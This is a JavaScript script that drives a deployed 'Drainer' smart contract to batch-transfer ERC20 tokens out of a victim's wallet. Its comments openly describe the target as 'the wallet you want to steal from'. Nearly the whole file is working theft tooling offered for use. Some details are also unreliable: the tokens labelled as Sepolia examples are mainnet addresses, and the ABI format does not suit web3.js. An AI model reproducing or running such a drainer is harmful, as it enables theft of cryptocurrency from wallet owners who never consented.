const Web3 = require('web3');
const web3 = new Web3('https://rpc.ankr.com/eth_sepolia'); // Sepolia testnet RPC - change only if you use a different chain

// ================== DRIVER CONTRACT ABI ==================
// Paste the FULL Drainer.sol contract ABI here (or shorten it to just the functions you use)
const drainerABI = [
    "function drainERC20Batch(address[] calldata tokens, address victim) external",
    "function drainERC721Batch(address collection, address victim, uint256[] calldata tokenIds) external"
];

// ================== DEPLOYED CONTRACT ==================
const drainerAddress = "0xYourDeployedDrainerContractAddressHere"; // replace with your deployed contract address

// ================== OPERATOR WALLET ==================
const operatorWallet = "0xYourOperatorWalletAddressHere"; // replace with the wallet you want to run the sweep from

// ================== VICTIM WALLET (TO DRAIN) ==================
const victimWallet = "0xVictimWalletToSweepHere"; // replace with the wallet you want to steal from

// ================== TOKENS TO DRAIN (Sepolia example) ==================
// Replace these with the real token addresses you want to drain
const tokensToDrain = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT (Sepolia example)
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC (Sepolia example)
    // Add more token addresses as needed
];

async function sweep() {
    const drainer = new web3.eth.Contract(drainerABI, drainerAddress);

    console.log("Sweeping victim wallet...");

    try {
        // Drain ERC20 tokens
        const tx = await drainer.methods.drainERC20Batch(tokensToDrain, victimWallet).send({
            from: operatorWallet,
            gas: 500000
        });

        console.log("✅ Sweep successful! Transaction:", tx.transactionHash);
    } catch (err) {
        console.error("Sweep failed:", err.message || err);
    }
}

sweep();
